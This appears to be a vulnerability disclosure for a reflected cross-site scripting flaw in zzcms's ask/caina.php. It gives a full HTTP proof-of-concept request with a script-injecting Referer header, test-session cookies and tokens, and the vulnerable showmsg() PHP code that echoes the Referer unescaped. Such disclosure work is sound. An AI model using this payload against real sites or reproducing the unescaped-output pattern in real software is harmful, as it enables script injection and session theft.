### ask/caina.php frontend reflective xss

visit/ask/caina.php
Send POC

```java
POST /ask/caina.php HTTP/1.1
Host: zzcms:8786
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=4pj41bdnhl1msnbrl2lljv1iqm; __51cke__=; xywpwx_bakusername=admin; xywpwx_snsjjssbdvqm=aca496e77ae7ceff46c2f8e72f4235d5; qebak_efourcheck=be67da7f3e3c39cd439799a20c67f8b4; XDEBUG_SESSION=PHPSTORM; xywpwx_bakrnd=zPwzzERUvdP4; xywpwx_loginebakckpass=03269d863bac377ff8cfb81722e356e3; xywpwx_baklogintime=1724589372; __tins__713776=%7B%22sid%22%3A%201724603456590%2C%20%22vd%22%3A%206%2C%20%22expires%22%3A%201724605579607%7D; __51laig__=34
Connection: keep-alive
Referer: ";alert(123);</script><script>"
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```

![image-20240827011526251](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240827011526251.png)

![image-20240827011440179](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240827011440179.png)

Code Analysis

Locate the ask/caina.php

```java
showmsg('采纳成功',$_SERVER['HTTP_REFERER']);
```

where our $_SERVER['HTTP_REFERERER'] can be controlled by the Referer header

showmsg function

```php
function showmsg($msg,$zc_url = 'back',$exit=''){
   $str="<!DOCTYPE html>";//有些文件不能设文件头
   $str.="<meta http-equiv='Content-Type' content='text/html; charset=utf-8'>";
   if($zc_url && $zc_url!='back' && $zc_url!='null'){
   $str.="<script>alert('$msg');parent.location=\"$zc_url\";</script>";
   }elseif( $zc_url=='null'){
   $str.="<script>alert(\"$msg\")</script>";
   }else{
   $str.="<script>alert(\"$msg\");history.back();</script>";
   }
   echo $str;
   //if ($exit=='exit'){
   exit;//必须强制退出
   //}
}
```

Reflective xss injection caused by outputting $str directly to the html page.
